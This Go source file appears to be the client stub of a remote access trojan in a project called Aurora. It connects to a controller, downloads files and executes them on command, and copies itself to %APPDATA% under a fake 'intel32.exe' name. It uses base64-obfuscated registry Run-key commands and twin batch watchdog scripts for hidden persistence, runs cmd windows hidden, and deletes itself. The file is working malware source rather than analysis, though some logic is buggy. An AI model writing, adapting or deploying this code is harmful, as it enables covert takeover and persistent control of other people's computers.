package internal

import (
	. "Aurora/src/util"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"syscall"
	"time"
)

var homeDir string

type Stub struct {
	conn    net.Conn
	encoder *json.Encoder
	decoder *json.Decoder
	td      string
}

func main() {
	usr, _ := user.Current()
	homeDir = usr.HomeDir

	addStartup()
	addPersistence()
	stub := Stub{}
	stub.Start()
}

func (stub *Stub) Start() {
	for {
		stub.dial()
		time.Sleep(5000000000)
	}
}

func (stub *Stub) dial() {
	var err error
	stub.conn, err = net.Dial("tcp", "127.0.0.1:4731")
	if err != nil {
		fmt.Println(err)
	} else {
		stub.encoder = json.NewEncoder(stub.conn)
		stub.decoder = json.NewDecoder(stub.conn)
		stub.handlePackets()
	}
}

func (stub *Stub) handlePackets() {
	files := map[string]*os.File{}
	for {
		packet := Packet{}
		err := stub.decoder.Decode(&packet)
		if err == io.EOF {
			break
		} else if err != nil {
			return
		} else {
			fmt.Println(packet.GetForm())
			switch packet.GetForm() {
			case "FILE":
				if _, err := os.Stat(stub.td); os.IsNotExist(err) {
					err := os.MkdirAll(stub.td, os.ModeDir)
					if err != nil {
						fmt.Println(err)
					}
				}
				fileName := stub.td + "\\" + packet.GetStringData()
				if packet.GetComplete() && files[fileName] != nil {
					files[fileName].Close()
					delete(files, fileName)
					fmt.Println("Stub: Finished downloading", packet.GetStringData())
					Exec := exec.Command(files[fileName].Name())
					Exec.Start()
				} else if packet.GetComplete() && files[fileName] == nil {
					continue
				} else {
					if files[fileName] == nil {
						fmt.Println("Stub: Started downloading", packet.GetStringData())
						if _, err := os.Stat(fileName); os.IsNotExist(err) {
							files[fileName], _ = os.Create(fileName)
						} else {
							files[fileName], _ = os.Open(fileName)
						}
					}
					files[fileName].WriteAt(packet.GetFileData(), packet.GetBytePos()*1024)
				}
			case "STARTUP":
				addStartup()
			case "RMSTARTUP":
				removeStartup()
			case "PERSISTENCE":
				addPersistence()
			case "RMPERSISTENCE":
				removePersistence()
			case "UNINSTALL":
				uninstall()
			}
		}
	}
}

func (stub *Stub) sendFile(fileName string) {
	buffer := make([]byte, 1024)
	file, _ := os.Open(fileName)
	defer file.Close()

	i := 0
	for {
		_, err := file.Read(buffer)
		if err == io.EOF {
			stub.encoder.Encode(Packet{"FILE", "test.exe", 0, nil, true})
			break
		}
		stub.encoder.Encode(Packet{"FILE", "test.exe", int64(i), buffer, false})
		i++
	}
	stub.encoder.Encode(Packet{"MESSAGE", "DONE", 0, nil, false})
}

func uninstall() {
	removeStartup()
	removePersistence()
	delSelf()
}

func delSelf() {
	var sI syscall.StartupInfo
	var pI syscall.ProcessInformation
	argv, _ := syscall.UTF16PtrFromString(os.Getenv("windir") + "\\system32\\cmd.exe /C del " + os.Args[0])
	syscall.CreateProcess(
		nil,
		argv,
		nil,
		nil,
		true,
		0,
		nil,
		nil,
		&sI,
		&pI)
	os.Exit(0)
}

func addPersistence() {
	cmd("mkdir %APPDATA%\\Windows")
	/*
		TITLE ms32
		SETLOCAL EnableExtensions
		:SEARCH
		tasklist /fi "WINDOWTITLE eq ms64" | findstr /C:"No tasks are running"
		if %errorlevel% NEQ 1 (
		  %APPDATA%\Windows\ms64.bat
		  timeout 1
		)
		set EXE=intel32.exe
		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
		start %APPDATA%\Windows\intel32.exe
		goto SEARCH
	*/

	if _, err := os.Stat("%APPDATA%\\Windows\\ms32.bat"); os.IsNotExist(err) {
		ms32Code := "VElUTEUgbXMzMg0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczY0IiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zNjQuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
		ms32Decoded, _ := base64.StdEncoding.DecodeString(ms32Code)

		ms32, _ := os.Create(homeDir + "\\Windows\\ms32.bat")
		ms32.WriteString(string(ms32Decoded))
		ms32.Close()

		cmd("%APPDATA%\\Windows\\ms32.bat")
	}

	/*
		TITLE ms64
		SETLOCAL EnableExtensions
		:SEARCH
		tasklist /fi "WINDOWTITLE eq ms32" | findstr /C:"No tasks are running"
		if %errorlevel% NEQ 1 (
		  %APPDATA%\Windows\ms32.bat
		  timeout 1
		)
		set EXE=intel32.exe
		FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF %%x == %EXE% goto SEARCH
		start %APPDATA%\Windows\intel32.exe
		goto SEARCH
	*/

	if _, err := os.Stat("%APPDATA%\\Windows\\ms64.bat"); os.IsNotExist(err) {
		ms64Code := "VElUTEUgbXM2NA0KU0VUTE9DQUwgRW5hYmxlRXh0ZW5zaW9ucw0KOlNFQVJDSA0KdGFza2xpc3QgL2ZpICJXSU5ET1dUSVRMRSBlcSBtczMyIiB8IGZpbmRzdHIgL0M6Ik5vIHRhc2tzIGFyZSBydW5uaW5nIiANCmlmICVlcnJvcmxldmVsJSBORVEgMSAoDQogICVBUFBEQVRBJVxXaW5kb3dzXG1zMzIuYmF0DQogIHRpbWVvdXQgMQ0KKQ0Kc2V0IEVYRT1pbnRlbDMyLmV4ZQ0KRk9SIC9GICUleCBJTiAoJ3Rhc2tsaXN0IC9OSCAvRkkgIklNQUdFTkFNRSBlcSAlRVhFJSInKSBETyBJRiAlJXggPT0gJUVYRSUgZ290byBTRUFSQ0gNCnN0YXJ0ICVBUFBEQVRBJVxXaW5kb3dzXGludGVsMzIuZXhlDQpnb3RvIFNFQVJDSA=="
		ms64Decoded, _ := base64.StdEncoding.DecodeString(ms64Code)

		ms64, _ := os.Create(homeDir + "\\Windows\\ms64.bat")
		ms64.WriteString(string(ms64Decoded))
		ms64.Close()

		cmd("%APPDATA%\\Windows\\ms64.bat")
	}
}

func removePersistence() {
	/*
		Taskkill /IM ms32.bat /F
		Taskkill /IM ms64.bat /F
	*/

	code := "VGFza2tpbGwgL0lNIG1zMzIuYmF0IC9GDQpUYXNra2lsbCAvSU0gbXM2NC5iYXQgL0Y="
	decoded, _ := base64.StdEncoding.DecodeString(code)

	persist, _ := os.Create(homeDir + "\\Windows\\end.bat")
	persist.WriteString(string(decoded))
	persist.Close()

	cmd("%APPDATA%\\Windows\\end.bat")
	cmd("del %APPDATA%\\Windows\\ms32.bat")
	cmd("del %APPDATA%\\Windows\\ms64.bat")
	cmd("del %APPDATA%\\Windows\\end.bat")
}

func addStartup() {
	// REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /t REG_SZ /F /D %APPDATA%\Windows\intel32.exe
	if _, err := os.Stat("%APPDATA%\\Windows\\intel32.exe"); os.IsNotExist(err) {
		RegAdd := "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC90IFJFR19TWiAvRiAvRCAlQVBQREFUQSVcV2luZG93c1xpbnRlbDMyLmV4ZQ=="
		DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)

		cmd("copy " + os.Args[0] + " %APPDATA%\\Windows\\intel32.exe")
		cmd(string(DecodedReg))

		time.Sleep(1000000000)

		delSelf()
	}
}

func removeStartup() {
	// REG DELETE HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V Intel32 /F
	RegAdd := "UkVHIERFTEVURSBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBJbnRlbDMyIC9G"
	DecodedReg, _ := base64.StdEncoding.DecodeString(RegAdd)
	cmd(string(DecodedReg))
}

func cmd(cmd string) {
	run := exec.Command("cmd", "/C", cmd)
	run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	run.Run()
}
